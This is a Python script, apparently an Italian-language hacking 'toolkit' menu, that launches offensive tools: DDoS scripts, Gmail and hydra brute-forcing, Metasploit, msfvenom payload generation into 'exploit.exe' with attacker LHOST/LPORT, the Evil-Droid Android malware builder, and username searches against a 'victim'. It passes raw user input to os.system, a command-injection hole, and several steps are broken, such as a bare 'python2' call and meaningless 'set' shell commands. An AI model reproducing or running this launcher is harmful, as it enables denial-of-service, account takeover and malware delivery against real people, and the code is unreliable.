import colorama
import os
from colorama import *
colorama.init()
init(autoreset=True)


print('\33[34m' + "")
print('\33[34m' +"   ____        __      _   ________      __      _   __    __   __     __  ")
print('\33[34m' +"  (    )      /  \    / ) (___  ___)    /  \    / )  ) )  ( (  (_ \   / _)")
print('\33[34m' +"  / /\ \     / /\ \  / /      ) )      / /\ \  / /  ( (    ) )   \ \_/ /   ")
print('\33[34m' +" ( (__) )    ) ) ) ) ) )     ( (       ) ) ) ) ) )   ) )  ( (     \   /    ")
print('\33[34m' +"  )    (    ( ( ( ( ( (       ) )     ( ( ( ( ( (   ( (    ) )    / _ \    ")
print('\33[34m' +" /  /\  \   / /  \ \/ /      ( (      / /  \ \/ /    ) \__/ (   _/ / \ \_  ")
print('\33[34m' +"/__(  )__\ (_/    \__/       /__\    (_/    \__/     \______/  (__/   \__) ")

print('\33[34m' + " ________     ____       ____     _____        __   ___    _____   ________ ")
print('\33[34m' +"(___  ___)   / __ \     / __ \   (_   _)      () ) / __)  (_   _) (___  ___) ")
print('\33[34m' +"   ) )      / /  \ \   / /  \ \    | |        ( (_/ /       | |       ) )    ")
print('\33[34m' +"   ( (     ( ()  () ) ( ()  () )   | |        ()   (        | |      ( (     ")
print('\33[34m' +"   ) )     ( ()  () ) ( ()  () )   | |   __   () /\ \       | |       ) )    ")
print('\33[34m' +"   ( (      \ \__/ /   \ \__/ /  __| |___) )  ( (  \ \     _| |__    ( (     ")
print('\33[34m' +"   /__\      \____/     \____/   \________/   ()_)  \_\   /_____(    /__\    ")
print('\33[33m ' + "-----------------------------created by antnux-------------------------------")
print("1. ifconfig")
print("2. Port Scan")
print("3. DDoS")
print("4. BruteForce")
print("5. Remote Access")
print("6. Information Gethering")
print("7. Utility")
scelta = int(input(">")) 
if scelta == 1:                         #IFCONFIG
    os.system("ifconfig")
    input("premi invio per continuare")
    os.system("clear")
    os.system("python3 toolkit.py")
if scelta == 2:                                       #NMAP PORT SCAN
    host = input("\n inserisci l'host: ")
    os.system("nmap " + host)
    input("premi invio per continuare")
    os.system("python3 toolkit.py")
if scelta == 3:
    print('\33[34m' +"   ____        __      _   ________      __      _   __    __   __     __  ")
    print('\33[34m' +"  (    )      /  \    / ) (___  ___)    /  \    / )  ) )  ( (  (_ \   / _)")
    print('\33[34m' +"  / /\ \     / /\ \  / /      ) )      / /\ \  / /  ( (    ) )   \ \_/ /   ")
    print('\33[34m' +" ( (__) )    ) ) ) ) ) )     ( (       ) ) ) ) ) )   ) )  ( (     \   /    ")
    print('\33[34m' +"  )    (    ( ( ( ( ( (       ) )     ( ( ( ( ( (   ( (    ) )    / _ \    ")
    print('\33[34m' +" /  /\  \   / /  \ \/ /      ( (      / /  \ \/ /    ) \__/ (   _/ / \ \_  ")
    print('\33[34m' +"/__(  )__\ (_/    \__/       /__\    (_/    \__/     \______/  (__/   \__) ")

    print('\33[34m' + " ________     ____       ____     _____        __   ___    _____   ________ ")
    print('\33[34m' +"(___  ___)   / __ \     / __ \   (_   _)      () ) / __)  (_   _) (___  ___) ")
    print('\33[34m' +"   ) )      / /  \ \   / /  \ \    | |        ( (_/ /       | |       ) )    ")
    print('\33[34m' +"   ( (     ( ()  () ) ( ()  () )   | |        ()   (        | |      ( (     ")
    print('\33[34m' +"   ) )     ( ()  () ) ( ()  () )   | |   __   () /\ \       | |       ) )    ")
    print('\33[34m' +"   ( (      \ \__/ /   \ \__/ /  __| |___) )  ( (  \ \     _| |__    ( (     ")
    print('\33[34m' +"   /__\      \____/     \____/   \________/   ()_)  \_\   /_____(    /__\    ")
    print('\33[33m ' + "-----------------------------created by antnux-------------------------------")     
    print("1. DDoS")
    print("2. DDoS Ripper")    
                         #DDoS
    scelta6 = int(input("> "))
    if scelta6 == 1:
        os.system("cd tools/DDoS && python2 ")
        os.system("clear")
        os.system("python3 toolkit.py")

    if scelta6 == 2:
        os.system("python2 tools/DDos-Attack/ddos-attack.py")
        #os.system("clear")
        #os.system("python3 toolkit.py ")
if scelta == 4:                                   #BRUTEFORCE
    os.system("clear")
    print('\33[34m' +"   ____        __      _   ________      __      _   __    __   __     __  ")
    print('\33[34m' +"  (    )      /  \    / ) (___  ___)    /  \    / )  ) )  ( (  (_ \   / _)")
    print('\33[34m' +"  / /\ \     / /\ \  / /      ) )      / /\ \  / /  ( (    ) )   \ \_/ /   ")
    print('\33[34m' +" ( (__) )    ) ) ) ) ) )     ( (       ) ) ) ) ) )   ) )  ( (     \   /    ")
    print('\33[34m' +"  )    (    ( ( ( ( ( (       ) )     ( ( ( ( ( (   ( (    ) )    / _ \    ")
    print('\33[34m' +" /  /\  \   / /  \ \/ /      ( (      / /  \ \/ /    ) \__/ (   _/ / \ \_  ")
    print('\33[34m' +"/__(  )__\ (_/    \__/       /__\    (_/    \__/     \______/  (__/   \__) ")

    print('\33[34m' + " ________     ____       ____     _____        __   ___    _____   ________ ")
    print('\33[34m' +"(___  ___)   / __ \     / __ \   (_   _)      () ) / __)  (_   _) (___  ___) ")
    print('\33[34m' +"   ) )      / /  \ \   / /  \ \    | |        ( (_/ /       | |       ) )    ")
    print('\33[34m' +"   ( (     ( ()  () ) ( ()  () )   | |        ()   (        | |      ( (     ")
    print('\33[34m' +"   ) )     ( ()  () ) ( ()  () )   | |   __   () /\ \       | |       ) )    ")
    print('\33[34m' +"   ( (      \ \__/ /   \ \__/ /  __| |___) )  ( (  \ \     _| |__    ( (     ")
    print('\33[34m' +"   /__\      \____/     \____/   \________/   ()_)  \_\   /_____(    /__\    ")
    print('\33[33m ' + "-----------------------------created by antnux-------------------------------")
    print("1. hydra")
    print("2. Gmail BruteForce")
    print("3. Yahoo BruteForce")
    print("4. Torna indietro")


    scelta2 = int(input())
    if scelta2 == 1:
        os.system("hydra")
    if scelta2 == 2:
        email = input("inserisci il target:")
        os.system("cd tools/GmailBruterV2 && python GmailBruterV2.py ")
        os.system("set target ")
        os.system(email)
        print("inserisci la wordlist")
        os.system("set list")
        print("inserisci il tempo")
        os.system("set time")
        os.system("start")
        input("premi invio per continuare")
        os.system("clear")
        os.system("python3 toolkit.py")
    if scelta2 == 3:
        print("work in progress")


    if scelta2 == 4:
        os.system("python3 toolkit.py")

if scelta == 5:                   #REMOTE ACCESS
    print('\33[34m' +"   ____        __      _   ________      __      _   __    __   __     __  ")
    print('\33[34m' +"  (    )      /  \    / ) (___  ___)    /  \    / )  ) )  ( (  (_ \   / _)")
    print('\33[34m' +"  / /\ \     / /\ \  / /      ) )      / /\ \  / /  ( (    ) )   \ \_/ /   ")
    print('\33[34m' +" ( (__) )    ) ) ) ) ) )     ( (       ) ) ) ) ) )   ) )  ( (     \   /    ")
    print('\33[34m' +"  )    (    ( ( ( ( ( (       ) )     ( ( ( ( ( (   ( (    ) )    / _ \    ")
    print('\33[34m' +" /  /\  \   / /  \ \/ /      ( (      / /  \ \/ /    ) \__/ (   _/ / \ \_  ")
    print('\33[34m' +"/__(  )__\ (_/    \__/       /__\    (_/    \__/     \______/  (__/   \__) ")

    print('\33[34m' + " ________     ____       ____     _____        __   ___    _____   ________ ")
    print('\33[34m' +"(___  ___)   / __ \     / __ \   (_   _)      () ) / __)  (_   _) (___  ___) ")
    print('\33[34m' +"   ) )      / /  \ \   / /  \ \    | |        ( (_/ /       | |       ) )    ")
    print('\33[34m' +"   ( (     ( ()  () ) ( ()  () )   | |        ()   (        | |      ( (     ")
    print('\33[34m' +"   ) )     ( ()  () ) ( ()  () )   | |   __   () /\ \       | |       ) )    ")
    print('\33[34m' +"   ( (      \ \__/ /   \ \__/ /  __| |___) )  ( (  \ \     _| |__    ( (     ")
    print('\33[34m' +"   /__\      \____/     \____/   \________/   ()_)  \_\   /_____(    /__\    ")
    print('\33[33m ' + "-----------------------------created by antnux-------------------------------")
    print("1. metasploit")
    print("2. msfvenom")
    print("3. Evil-Droid")
    print("4. Torna indietro")
    scelta3 = int(input())
    if scelta3 == 1:
        os.system("msfconsole")
    if scelta3 == 2:
        LHOST = input("inserisci LHOST: ")
        LPORT = str(input("inserisci LPORT: "))
        payload = input("inserisci il PAYLOAD: ")
        os.system("msfvenom -p " + payload + " LHOST=" + LHOST + " LPORT=" + LPORT + " -f exe > exploit.exe")

        input("premi invio per continuare") 
        os.system("clear")
        os.system("python3 toolkit.py")
    if scelta3 == 3:
        os.system("cd tools/Evil-Droid/ && bash evil-droid")
        input("premi invio per continuare") 
        os.system("clear")
        os.system("python3 toolkit.py")
    if scelta == 4:
        os.system("python3 toolkit.py")
        os.system("clear")
    else:
        os.system("clear")
        os.system("python3 toolkit.py")

if scelta == 6:                       #INFORMATIOGATHERING
    print('\33[34m' +"   ____        __      _   ________      __      _   __    __   __     __  ")
    print('\33[34m' +"  (    )      /  \    / ) (___  ___)    /  \    / )  ) )  ( (  (_ \   / _)")
    print('\33[34m' +"  / /\ \     / /\ \  / /      ) )      / /\ \  / /  ( (    ) )   \ \_/ /   ")
    print('\33[34m' +" ( (__) )    ) ) ) ) ) )     ( (       ) ) ) ) ) )   ) )  ( (     \   /    ")
    print('\33[34m' +"  )    (    ( ( ( ( ( (       ) )     ( ( ( ( ( (   ( (    ) )    / _ \    ")
    print('\33[34m' +" /  /\  \   / /  \ \/ /      ( (      / /  \ \/ /    ) \__/ (   _/ / \ \_  ")
    print('\33[34m' +"/__(  )__\ (_/    \__/       /__\    (_/    \__/     \______/  (__/   \__) ")

    print('\33[34m' + " ________     ____       ____     _____        __   ___    _____   ________ ")
    print('\33[34m' +"(___  ___)   / __ \     / __ \   (_   _)      () ) / __)  (_   _) (___  ___) ")
    print('\33[34m' +"   ) )      / /  \ \   / /  \ \    | |        ( (_/ /       | |       ) )    ")
    print('\33[34m' +"   ( (     ( ()  () ) ( ()  () )   | |        ()   (        | |      ( (     ")
    print('\33[34m' +"   ) )     ( ()  () ) ( ()  () )   | |   __   () /\ \       | |       ) )    ")
    print('\33[34m' +"   ( (      \ \__/ /   \ \__/ /  __| |___) )  ( (  \ \     _| |__    ( (     ")
    print('\33[34m' +"   /__\      \____/     \____/   \________/   ()_)  \_\   /_____(    /__\    ")
    print('\33[33m ' + "-----------------------------created by antnux-------------------------------")
    print("1. sherlock")
    print("2. IP-Tracker")
    scelta4 = int(input())
    if scelta4 == 1:
       nomesherlock = input("inserisci il nickname della vittima: ")
       os.system("cd tools/sherlock/sherlock && python sherlock.py " + nomesherlock)
       input("premi invio per continuare")
       os.system("python3 toolkit.py")
    if scelta4 == 2:
        os.system("cd tools/IP-Track && bash IP-Track")
    else:
       print("dio porco")

if scelta == 7:
    print('\33[34m' +"   ____        __      _   ________      __      _   __    __   __     __  ")
    print('\33[34m' +"  (    )      /  \    / ) (___  ___)    /  \    / )  ) )  ( (  (_ \   / _)")
    print('\33[34m' +"  / /\ \     / /\ \  / /      ) )      / /\ \  / /  ( (    ) )   \ \_/ /   ")
    print('\33[34m' +" ( (__) )    ) ) ) ) ) )     ( (       ) ) ) ) ) )   ) )  ( (     \   /    ")
    print('\33[34m' +"  )    (    ( ( ( ( ( (       ) )     ( ( ( ( ( (   ( (    ) )    / _ \    ")
    print('\33[34m' +" /  /\  \   / /  \ \/ /      ( (      / /  \ \/ /    ) \__/ (   _/ / \ \_  ")
    print('\33[34m' +"/__(  )__\ (_/    \__/       /__\    (_/    \__/     \______/  (__/   \__) ")

    print('\33[34m' + " ________     ____       ____     _____        __   ___    _____   ________ ")
    print('\33[34m' +"(___  ___)   / __ \     / __ \   (_   _)      () ) / __)  (_   _) (___  ___) ")
    print('\33[34m' +"   ) )      / /  \ \   / /  \ \    | |        ( (_/ /       | |       ) )    ")
    print('\33[34m' +"   ( (     ( ()  () ) ( ()  () )   | |        ()   (        | |      ( (     ")
    print('\33[34m' +"   ) )     ( ()  () ) ( ()  () )   | |   __   () /\ \       | |       ) )    ")
    print('\33[34m' +"   ( (      \ \__/ /   \ \__/ /  __| |___) )  ( (  \ \     _| |__    ( (     ")
    print('\33[34m' +"   /__\      \____/     \____/   \________/   ()_)  \_\   /_____(    /__\    ")
    print('\33[33m ' + "-----------------------------created by antnux-------------------------------")

    print("1. figlet")
    print("2. exit")
    scelta5 = int(input("> "))
    if scelta5 == 1:
        testo5 = input("inserisci il testo: ")
        os.system("figlet "+  testo5)
        input("premi invio per continuare")
        os.system("python3 toolkit.py")
